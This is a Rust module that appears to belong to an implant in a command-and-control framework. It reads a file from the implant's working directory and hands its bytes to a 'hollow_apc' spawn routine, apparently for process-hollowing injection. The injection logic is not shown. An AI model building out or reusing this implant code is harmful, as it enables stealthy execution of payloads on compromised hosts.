use std::{
    fs::{self, File},
    io::Read,
    path::PathBuf,
};

use shared::tasks::WyrmResult;

use crate::{
    native::filesystem::{PathParseType, parse_path},
    spawn::hollow_apc::spawn_sibling,
};

pub mod hollow_apc;

pub struct Spawn;

impl Spawn {
    pub fn spawn_sibling(path: &str, implant_working_dir: &PathBuf) -> WyrmResult<String> {
        let path = match parse_path(path, implant_working_dir, PathParseType::File) {
            WyrmResult::Ok(p) => p,
            WyrmResult::Err(e) => {
                #[cfg(debug_assertions)]
                println!("Failed to parse path {path}. {e}");

                return WyrmResult::Err(e);
            }
        };

        let Ok(buf) = fs::read(path) else {
            return WyrmResult::Err(format!("Could not read file"));
        };
        spawn_sibling(buf)
    }
}
